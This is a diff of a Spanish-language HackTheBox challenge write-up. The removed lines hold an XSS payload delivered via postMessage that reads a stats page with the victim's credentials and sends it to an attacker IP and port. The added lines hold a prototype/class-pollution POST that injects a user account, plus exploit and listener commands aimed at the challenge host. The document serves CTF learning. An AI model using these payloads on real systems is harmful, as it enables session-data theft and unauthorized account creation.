@@ -131,36 +131,34 @@ Y hay que obtener el IP del contenedor en terminal con:
 ip addr show | grep "inet " | grep -v 127
 ```
 
-Se crea un codigo html con los puertos que aprovecha el window.addEventListener("message", ...) en tornado-service.js toma tornado.machine_id y lo mete directo en .innerHTML sin sanitizar. Eso ejecuta un `<img onerror>`.
+Se crea un codigo html con los puertos que aprovecha el window.addEventListener("message", ...) en tornado-service.js toma tornado.machine_id y lo mete directo en `.innerHTML` sin sanitizar.
 
 ```html
 <!DOCTYPE html>
-<html>
-<body>
-<script>
-  const yourIP = "172.17.0.1"; // Cambia esto por TU IP
-  const yourPort = "8383";
-
-  const xssPayload = `<img src=x onerror="
-    fetch('http://localhost:1337/stats', {credentials:'include'})
-    .then(r=>r.text())
-    .then(d=>{
-      fetch('http://${yourIP}:${yourPort}/?flag='+encodeURIComponent(d))
-    })
-  ">`;
-
-  const win = window.open('http://localhost:1337');
-
-  setTimeout(() => {
-    win.postMessage({
-      machine_id: xssPayload,
-      ip_address: '1.1.1.1',
-      status: 'active'
-    }, '*');
-  }, 3000);
-</script>
-</body>
-</html>
+<html><body><script>
+fetch('http://localhost:1337/update_tornado', {
+  method:'POST',
+  headers:{'Content-Type':'application/json'},
+  body: JSON.stringify({
+    machine_id: "host-1234",            // debe coincidir con un machine_id existente
+    __init__: { __globals__: { USERS: [ {username:"pwn@x.htb", password:"pwn"} ] } }
+  })
+});
+</script></body></html>
 ```
 
-Disparar el bot desde BurpSuite usando el repeater 
+Para ejecutarlo se abren dos terminales.
+
+```bash
+# Terminal 1:
+$ python3 server.py --target http://localhost:1337 --listen-port 8383 --user pwn@x.htb --pass pwn
+```
+
+```bash
+# Terminal 2:
+$ python3 exploit.py --challenge http://154.57.164.64:31988 --callback 10.10.15.7:8383 --user pwn@x.htb --pass pwn
+```
+
+Con esto se resuelve de manera local obteniendo el flag de prueba: `HTB{f4k3_fl4g_f0r_t35t1ng}`
+
+Ahora si continuamos con el challenge de HTB:
